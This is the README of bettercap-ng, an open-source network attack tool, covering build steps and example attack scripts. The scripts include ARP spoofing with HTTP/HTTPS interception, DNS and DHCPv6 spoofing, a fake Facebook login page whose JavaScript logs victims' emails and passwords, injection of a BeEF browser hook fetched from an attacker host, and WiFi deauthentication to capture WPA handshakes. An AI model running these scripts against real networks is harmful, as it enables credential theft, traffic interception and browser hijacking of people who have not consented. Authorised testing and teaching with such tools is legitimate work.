<p align="center">
  <img alt="BetterCap" src="https://raw.githubusercontent.com/evilsocket/bettercap-ng/master/media/logo.png" height="140" />
  <p align="center">
    <a href="https://github.com/evilsocket/bettercap-ng/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/evilsocket/bettercap-ng.svg?style=flat-square"></a>
    <a href="/LICENSE"><img alt="Software License" src="https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square"></a>
    <a href="https://travis-ci.org/evilsocket/bettercap-ng"><img alt="Travis" src="https://img.shields.io/travis/evilsocket/bettercap-ng/master.svg?style=flat-square"></a>
    <a href="https://goreportcard.com/report/github.com/evilsocket/bettercap-ng"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/evilsocket/bettercap-ng?style=flat-square&fuckgithubcache=1"></a>
  </p>
</p>

**bettercap-ng** is a complete reimplementation of bettercap, the Swiss army knife for network attacks and monitoring. It is faster, stabler, smaller, easier to install and to use.

## Using it with Docker

In this repository, BetterCAP is containerized using [Alpine Linux](https://alpinelinux.org/ "") -  a security-oriented, lightweight Linux distribution based on musl libc and busybox. The resulting Docker image is relatively small and easy to manage the dependencies.

To pull latest BetterCAP version of the image:

    $ docker pull evilsocket/bettercap-ng

To run:

    $ docker run -it --privileged --net=host evilsocket/bettercap-ng -h

## Compilation

Make sure you have a correctly configured **Go >= 1.8** environment, that `$GOPATH/bin` is in `$PATH` and the `libpcap-dev` package installed for your system, then:

    $ go get github.com/evilsocket/bettercap-ng

This command will download bettercap-ng, install its dependencies, compile it and move the `bettercap-ng` executable to `$GOPATH/bin`.

Now you can use `sudo bettercap-ng -h` to show the basic command line options and just `sudo bettercap-ng` to start an interactive session on your default network interface.

## Compilation on Windows

Despite Windows support [is not yet 100% complete](https://github.com/evilsocket/bettercap-ng/issues/45), it is possible to build bettercap-ng for Microsoft platforms and enjoy 99.99% of the experience. The steps to prepare the building environment are:

- Install [go amd64](https://golang.org/dl/) (add go binaries to your `%PATH%`).
- Install [TDM GCC for amd64](http://tdm-gcc.tdragon.net/download) (add TDM-GCC binaries to your `%PATH%`).
- Also add `TDM-GCC\x86_64-w64-mingw32\bin` to your `%PATH%`.
- Install [winpcap](https://www.winpcap.org/install/default.htm).
- Download [Winpcap developer's pack](https://www.winpcap.org/devel.htm) and extract it to `C:\`.
- Find `wpcap.dll` and `packet.dll` in your PC (typically in `c:\windows\system32`).
- Copy them to some other temp folder or else you'll have to supply Admin privs to the following commands.
- Run `gendef` on those files: `gendef wpcap.dll` and `gendef packet.dll` (obtainable with `MinGW Installation Manager`, package `mingw32-gendef`).

This will generate `.def` files, now we'll generate the static libraries files:

- Run `dlltool --as-flags=--64 -m i386:x86-64 -k --output-lib libwpcap.a --input-def wpcap.def`.
- and `dlltool --as-flags=--64 -m i386:x86-64 -k --output-lib libpacket.a --input-def packet.def`.
- Copy both `libwpcap.a` and `libpacket.a` to `c:\WpdPack\Lib\x64`.

And eventually just `go get github.com/evilsocket/bettercap-ng` as you would do on other platforms.

## Cross Compilation

As an example, let's cross compile bettercap for ARM (requires `gcc-arm-linux-gnueabi`, `yacc` and `flex` packages).

Download and cross compile libpcap-1.8.1 for ARM (adjust `PCAPV` to use a different libpcap version):

    cd /tmp
    export PCAPV=1.8.1
    wget http://www.tcpdump.org/release/libpcap-$PCAPV.tar.gz
    tar xvf libpcap-$PCAPV.tar.gz
    cd libpcap-$PCAPV
    export CC=arm-linux-gnueabi-gcc
    ./configure --host=arm-linux --with-pcap=linux
    make

Cross compile bettercap-ng itself:

    cd $GOPATH/src/github.com/evilsocket/bettercap-ng
    env CC=arm-linux-gnueabi-gcc CGO_ENABLED=1 GOOS=linux GOARCH=arm CGO_LDFLAGS="-L/tmp/libpcap-$PCAPV" make

## Interactive Mode

If no `-caplet` option is specified, bettercap-ng will start in interactive mode, allowing you to start and stop modules manually, change options and apply new firewall rules on the fly.

To get a grasp of what you can do, type `help` and the general help menu will be shown, you can also have module specific help by using `help module-name` (for instance try with `help net.recon`).

To print all variables and their values instead, you can use `get *` or `get variable-name` to get a single variable (try with `get gateway.address`), to set a new value you can simply `set variable-name new-value` (a value of `""` will clear the variable contents).

## Caplets

Interactive sessions can be scripted with `.cap` files, or `caplets`, the following are a few basic examples, look the `caplets` folder for more.

#### caplets/http-req-dump.cap

Execute an ARP spoofing attack on the whole network (by default) or on a host (using `-eval` as described), intercept HTTP and HTTPS requests with the `http.proxy` and `https.proxy` modules and dump them using the `http-req-dumsp.js` proxy script.

```sh
# targeting the whole subnet by default, to make it selective:
#
#   sudo ./bettercap-ng -caplet caplets/http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"

# to make it less verbose
# events.stream off

# discover a few hosts 
net.probe on
sleep 1
net.probe off

# uncomment to enable sniffing too
# set net.sniff.verbose false
# set net.sniff.local true
# set net.sniff.filter tcp port 443
# net.sniff on

# we'll use this proxy script to dump requests
set https.proxy.script caplets/http-req-dump.js
set http.proxy.script caplets/http-req-dump.js
clear

# go ^_^
http.proxy on
https.proxy on
arp.spoof on
```

#### caplets/netmon.cap

An example of how to use the `ticker` module, use this caplet to monitor activities on your network.

```sh
net.probe on
clear
ticker on
```

#### caplets/mitm6.cap

[Reroute IPv4 DNS requests by using DHCPv6 replies](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/), start a HTTP server and DNS spoofer for `microsoft.com` and `google.com`.

```sh
# let's spoof Microsoft and Google ^_^
set dns.spoof.domains microsoft.com, google.com
set dhcp6.spoof.domains microsoft.com, google.com

# every request http request to the spoofed hosts will come to us
# let's give em some contents
set http.server.path caplets/www

# serve files
http.server on
# redirect DNS request by spoofing DHCPv6 packets
dhcp6.spoof on
# send spoofed DNS replies ^_^
dns.spoof on

# set a custom prompt for ipv6
set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
# clear the events buffer and the screen
events.clear
clear
```

<center>
    <img src="https://pbs.twimg.com/media/DTXrMJJXcAE-NcQ.jpg:large" width="100%"/>
</center>

#### caplets/rest-api.cap

Start a rest API.

```sh
# change these!
set api.rest.username bcap
set api.rest.password bcap
# set api.rest.port 8082

# actively probe network for new hosts
net.probe on

# enjoy /api/session and /api/events
api.rest on
```

Get information about the current session:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/session

Execute a command in the current interactive session:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/session -H "Content-Type: application/json" -X POST -d '{"cmd":"net.probe on"}'

Get last 50 events:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/events?n=50

Clear events:

    curl -k --user bcap:bcap -X DELETE https://bettercap-ip:8083/api/events

<center>
    <img src="https://pbs.twimg.com/media/DTAreSCX4AAXX6v.jpg:large" width="100%"/>
</center>

#### caplets/fb-phish.cap

This caplet will create a fake Facebook login page on port 80, intercept login attempts using the `http.proxy`, print credentials and redirect the target to the real Facebook.

<center>
    <img src="https://pbs.twimg.com/media/DTY39bnXcAAg5jX.jpg:large" width="100%"/>
</center>

Make sure to create the folder first:

    $ cd caplets/www/
    $ make

```sh
set http.server.address 0.0.0.0
set http.server.path caplets/www/www.facebook.com/

set http.proxy.script caplets/fb-phish.js

http.proxy on
http.server on
```

The `caplets/fb-phish.js` proxy script file:

```javascript
function onRequest(req, res) {
    if( req.Method == "POST" && req.Path == "/login.php" && req.ContentType == "application/x-www-form-urlencoded" ) {
        var form = req.ParseForm();
        var email = form["email"] || "?", 
            pass  = form["pass"] || "?";

        log( R(req.Client), " > FACEBOOK > email:", B(email), " pass:'" + B(pass) + "'" );

        res.Status      = 301;
        res.Headers     = "Location: https://www.facebook.com/\n" +
                          "Connection: close";
    }
}
```

#### caplets/beef-inject.cap

Use a proxy script to inject a BEEF javascript hook:

```sh
# targeting the whole subnet by default, to make it selective:
#
#   sudo ./bettercap-ng -caplet caplets/beef-active.cap -eval "set arp.spoof.targets 192.168.1.64"

# inject beef hook
set http.proxy.script caplets/beef-inject.js
# redirect http traffic to a proxy
http.proxy on
# wait for everything to start properly
sleep 1
# make sure probing is off as it conflicts with arp spoofing
arp.spoof on
```

The `caplets/beef.inject.js` proxy script file:

```javascript
function onLoad() {
    console.log( "BeefInject loaded." );
    console.log("targets: " + env['arp.spoof.targets']);
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript" src="http://your-beef-box:3000/hook.js"></script></head>' 
            ); 
        }
    }
}
```

#### caplets/airmon.cap

Put a wifi interface in monitor mode and listen for frames in order to detect WiF access points and clients.

```
set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
set ticker.commands clear; wifi.show

# uncomment to disable channel hopping
# set wifi.recon.channel 1

wifi.recon on
ticker on
events.clear
clear
```

#### caplets/wpa\_handshake.cap

Use various modules to inject wifi frames performing a deauthentication attack, while a sniffer is waiting for WPA handshakes.

```
# swag prompt for wifi
set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}

# Sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.
set net.sniff.verbose true
set net.sniff.filter ether proto 0x888e
set net.sniff.output wpa.pcap
net.sniff on

# since we need to capture the handshake, we can't hop
# through channels but we need to stick to the one we're
# interested in otherwise the sniffer might lose packets.
set wifi.recon.channel 1

wifi.recon on

# uncomment to recon clients of a specific AP given its BSSID
# wifi.recon DE:AD:BE:EF:DE:AD

events.clear
clear

# now just deauth clients and wait ^_^
#
# Example:
#
# wifi.deauth AP-BSSID-HERE
#
# This will deauth every client for this specific access point,
# you can put it as ticker.commands to have the ticker module
# periodically deauth clients :D
```

## License

`bettercap` and `bettercap-ng` are made with ♥  by [Simone Margaritelli](https://www.evilsocket.net/) and they're released under the GPL 3 license.
